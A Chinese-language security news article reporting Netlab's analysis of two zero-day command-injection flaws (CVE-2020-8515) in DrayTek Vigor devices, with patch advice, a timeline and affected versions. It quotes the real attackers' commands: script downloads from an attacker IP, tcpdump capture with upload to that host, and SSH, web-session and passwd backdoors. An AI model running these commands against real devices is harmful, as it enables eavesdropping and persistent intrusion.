**上周，研究人员披露了两场对台湾DrayTek生产的企业级网络设备0day漏洞在野利用攻击活动的详细信息。**  

![enterprise-network-security.jpg](https://image.3001.net/images/20200330/15855368995695.jpg!small)

根据Netlab[报告](https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/)，至少有两个独立的黑客团体利用了设备中的两个严重远程命令注入漏洞（CVE-2020-8515），这些漏洞影响了DrayTek
Vigor企业交换机、负载平衡器、路由器和VPN网关设备，攻击者因此可以窃听网络流量并安装后门。

0day攻击始于去年11月底或12月初，并且可能潜在影响着数千台尚未安装最新固件的DrayTek交换机、Vigor
2960、3900、300B设备等，上个月DrayTek已经对漏洞发布了安全更新。

另一位研究人员在其博客中详细介绍，任何未经授权的远程攻击者都可以利用此次涉及的0day漏洞在系统上注入并执行任意命令。

![router-switch-vpn-hacking.jpg](https://image.3001.net/images/20200330/1585537742408.jpg!small)

报告说：“两个0day漏洞命令注入点是keyPath和rtick，它们位于/www/cgi-bin/mainfunction.cgi中，而对应的Web
Server程序是/ usr / sbin / lighttpd。”

![malware-attack.jpg](https://image.3001.net/images/20200330/15855377614952.jpg!small)

研究人员尚未将这两种攻击都归因于任何特定的组，但可以确认的是第一组攻击者只是监视网络流量，而第二组攻击者使用rtick命令注入漏洞来创建：

> 永不过期的Web会话后门；
>
> TCP端口22335和32459上的SSH后门；
>
> 用户“ wuwuhanhan”和密码“ caonimuqin”的系统后门帐户。

##  **keyPath命令注入漏洞分析**

漏洞类型：未经授权的远程命令执行漏洞

漏洞详细信息：DrayTek设备支持两种帐户密码传输方法，即纯文本和RSA加密传输。

对于RSA加密传输，交互逻辑为：

1、Web前端使用RSA公钥对用户名和密码进行加密，并使用keyPath字段指定RSA私钥的文件后缀来发起登录请求。

2、当formLogin()在功能/www/cgi-bin/mainfunction.cgi检测到keyPath字段不为空，解密开始;

3、formLogin()使用keyPathas作为输入，将以下路径/tmp/rsa/private_key_<keyPath>作为RSA私钥；

4、formLogin()在用户名和密码字段上执行Base64解码，将它们写入/tmp/rsa/binary_loginfile，并执行以下命令来解密用户名和密码

    
    
    openssl rsautl -inkey '/tmp/rsa/private_key_' -decrypt -in /tmp/rsa/binary_login

5、最后，该formLogin()功能将使用解密的用户名和密码继续验证。

这里的问题是keyPath没有非常强大的输入控制，这使得未经授权的远程命令执行成为可能。

漏洞修复：在1.5.1版中， keyPath将字段长度设置为30，并且内容必须为十六进制字符。

![1.png](https://image.3001.net/images/20200330/15855370293971.png!small)

##  **rtick命令注入漏洞分析**

漏洞类型：未经授权的远程命令执行漏洞

漏洞详细信息：当/www/cgi-bin/mainfunction.cgi需要访问验证码时，它调用函数formCaptcha()，该函数不检查rtick传入的时间戳，并直接调用/ usr /
sbin / captcha来生成<rtick>.gifCAPTCHA映像，该代码使命令注入成为可能。

漏洞修复：在1.5.1版中，供应商将rtick字段限制为仅使用[0-9]。

![2.png](https://image.3001.net/images/20200330/15855370623368.png!small)

##  **0day 攻击分析**

###  **攻击组A**

1、攻击者A使用keyPath命令注入漏洞下载并执行<http://103.82.143.51:58172/vig/tcpst1>脚本，然后进一步下载并执行以下脚本。

    
    
    http://103.82.143.51:58172/vi1
    
        <http://103.82.143.51:58172/vig/mailsend.sh1>

[](http://103.82.143.51:58172/vig/mailsend.sh1)

2、该脚本/etc/mailsend.sh用于在DrayTek
Vigor网络设备上的所有网络接口上进行监听，以侦听端口21、25、143和110。tcpdump命令/usr/sbin/tcpdump -i any -n
-nn port 21 or port 25 or port 143 or port 110 -s 65535 -w /data/firewall.pcap
&在后台运行，并且有一个crontab可以将捕获的数据包上传到<https://103.82.143.51:58443/uploLSkciajUS.php>，时间点在于每个星期一、星期三、星期五的0点。

###  **攻击组B**

1、攻击者B使用rtick命令注入漏洞创建了两组永不过期的Web会话后门 /var/session.json

    
    
    json -f /var/session.json set 7:CBZD1SOMBUHVAF34TPDGURT9RTMLRUDK username=sadmin level=7 lasttime=0 updatetime=0 | sed -i s/""\""0\""""/""0""/g /var/session.json | sed -i s/""\""7\""""/""7""/g /var/session.json
    
        json -f /var/session.json set 7:R8GFPS6E705MEXZWVQ0IB1SM7JTRVE57 username=sadmin level=7 lasttime=0 updatetime=0 | sed -i s/""\""0\""""/""0""/g /var/session.json | sed -i s/""\""7\""""/""7""/g /var/session.json

2、攻击者B进一步在TCP / 22335和TCP / 32459上创建SSH后门；

    
    
    /usr/sbin/dropbear -r /etc/config/dropbear_rsa_host_key -p 22335 | iptables -I PPTP_CTRL 1 -p tcp --dport 22335 -j ACCEPT
    
        /usr/sbin/dropbear -r /etc/config/dropbear_rsa_host_key -p 32459 | iptables -I PPTP_CTRL 1 -p tcp --dport 32459 -j ACCEPT

3、系统后门帐户也wuwuhanhan:caonimuqin添加进去了。

    
    
    sed -i /wuwuhanhan:/d /etc/passwd ; echo 'wuwuhanhan:$1$3u34GCgO$9Pklx3.3OVwbIBja/CzZN/:500:500:admin:/tmp:/usr/bin/clish' >> /etc/passwd ; cat /etc/passwd;
    
        sed -i /wuwuhanhan:/d /etc/passwd ; echo 'wuwuhanhan:$1$sbIljOP5$vacGOLqYAXcw3LWek9aJQ.:500:500:admin:/tmp:/usr/bin/clish' >> /etc/passwd ; cat /etc/passwd;

##  **Web会话后门**

当研究0day PoC时，可以发现，当session参数updatetime设置为0时，除非重新启动设备，否则DrayTek
Vigor网络设备将永远不会注销。（自动注销：禁用）

![3.png](https://image.3001.net/images/20200330/1585537099796.png!small)

值得一提的是，如果用户刚安装补丁固件或安装不久，那么很容易会受到后门的威胁，因为固件并不会自动删除后门帐户。

> “我们建议DrayTek Vigor用户及时检查并更新其固件，并检查系统上是否存在tcpdump进程、SSH后门帐户、Web Session后门等。”

该公司建议：“如果在路由器上启用了远程访问，请在不需要时将其禁用，并在可能的情况下使用访问控制列表。”

##  时间线

> 2019年12月4日，研究人员发现了使用DrayTek Vigor 0day keyPath漏洞的持续攻击；
>
> 2019年12月8日，研究人员找到了一个渠道报告此漏洞（但后来发现它没有解决）；
>
> 2019年12月25日，在推特上公开了IoC，并向一些国家CERT提供了更多详细信息；
>
> 2020年01月28日，发现使用DrayTek Vigor 0day rtick漏洞的持续攻击；
>
> 2020年02月1 日，MITER发布了CVE-2020-8515；
>
> 2020年02月10日，DrayTek发布了安全公告和最新固件修复。

##  受影响的固件版本列表如下：

> Vigor2960 <v1.5.1
>
> Vigor300B <v1.5.1
>
> Vigor3900 <v1.5.1
>
> VigorSwitch20P2121 <= v2.3.2
>
> VigorSwitch20G1280 <= v2.3.2
>
> VigorSwitch20P1280 <= v2.3.2
>
> VigorSwitch20G2280 <= v2.3.2
>
> VigorSwitch20P2280 <= v2.3.2

 ***参考来源：[Thehackernews](https://thehackernews.com/2020/03/draytek-network-hacking.html)，Sandra1432编译整理，转载请注明来自FreeBuf.COM**

